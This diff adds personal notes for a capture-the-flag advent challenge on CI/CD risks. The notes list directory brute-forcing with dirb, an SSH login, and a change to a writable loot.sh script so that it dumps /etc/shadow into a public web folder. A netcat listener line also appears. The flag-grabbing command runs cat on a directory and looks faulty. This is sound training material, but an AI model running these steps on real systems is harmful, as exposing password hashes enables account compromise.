@@ -349,3 +349,29 @@ McSkidy is back, yeah!
       ```
       nc -nvlp 1337
       ```
+
+# Task 19 - Day 14 - Networking / Dev(insecure)ops
+* CI/CD Overview
+   * CI - Continuous Integration - source code kept in central repo where everyone can work from
+   * CD - Continuous Delivery - integral steps where code is automatically deployed to test, pre-prod, and prod
+* CI/CD Risks
+   * Access security
+   * Permissions
+   * Keys and secrets
+   * User security
+   * Default configurations
+* Challenge
+   * Use the default wordlist in dirb to discover assets on the target
+      ```
+      dirb http://10.10.101.1
+      ```
+   * SSH with the provided credentials and review the /home/thegrinch/scripts folder
+   * Using the loot.sh file, modify it to grab /etc/shadow
+      ```
+      cat /etc/shadow > /var/www/html/ls.html
+      ```
+   * Using the loot.sh file, modify it to grab the flag in thegrinch's desktop
+      ```
+      cat /home/thegrinch/Desktop > /var/www/html/ls.html
+      ```
+
